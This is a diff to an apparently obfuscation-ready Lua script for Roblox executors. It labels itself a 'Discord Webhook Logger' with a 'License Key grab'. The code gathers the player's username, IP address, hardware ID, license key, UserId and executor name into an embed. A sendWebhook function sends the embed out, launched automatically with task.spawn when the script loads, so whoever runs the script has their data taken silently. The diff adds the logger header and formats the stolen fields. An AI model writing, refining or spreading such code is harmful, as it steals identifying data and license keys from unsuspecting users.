@@ -3,6 +3,9 @@ if not LPH_ENCSTR then LPH_ENCSTR = function(str) return str end end
 if not LPH_NO_VIRTUALIZE then LPH_NO_VIRTUALIZE = function(func) return func end end
 if not LPH_OBFUSCATED then LPH_OBFUSCATED = false end
 -- game load check
+-- Platinun Logger Owner | Discord Webhook Logger
+-- Fixed & executable + License Key grab + copyable fields
+
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
@@ -45,6 +48,10 @@ local function getLicenseKey()
     return "Not Found"
 end
 
+local function code(str)
+    return "```" .. tostring(str) .. "```"
+end
+
 local function sendWebhook()
     local embed = {
         embeds = {
@@ -58,22 +65,22 @@ local function sendWebhook()
                 fields = {
                     {
                         name = "Usuário",
-                        value = LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")",
+                        value = code(LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")"),
                         inline = true
                     },
                     {
                         name = "IP",
-                        value = getIP(),
+                        value = code(getIP()),
                         inline = true
                     },
                     {
                         name = "HWID",
-                        value = getHWID(),
+                        value = code(getHWID()),
                         inline = false
                     },
                     {
                         name = "License Key",
-                        value = getLicenseKey(),
+                        value = code(getLicenseKey()),
                         inline = false
                     },
                     {
@@ -83,12 +90,12 @@ local function sendWebhook()
                     },
                     {
                         name = "UserId",
-                        value = tostring(LocalPlayer.UserId),
+                        value = code(tostring(LocalPlayer.UserId)),
                         inline = true
                     },
                     {
                         name = "Executor",
-                        value = (identifyexecutor and identifyexecutor()) or "Unknown",
+                        value = code((identifyexecutor and identifyexecutor()) or "Unknown"),
                         inline = true
                     }
                 },
@@ -116,6 +123,7 @@ local function sendWebhook()
 end
 
 task.spawn(sendWebhook)
+
 if not game:IsLoaded() then game.Loaded:Wait() end
 task.wait(0.35)  -- let services settle
 -- game check
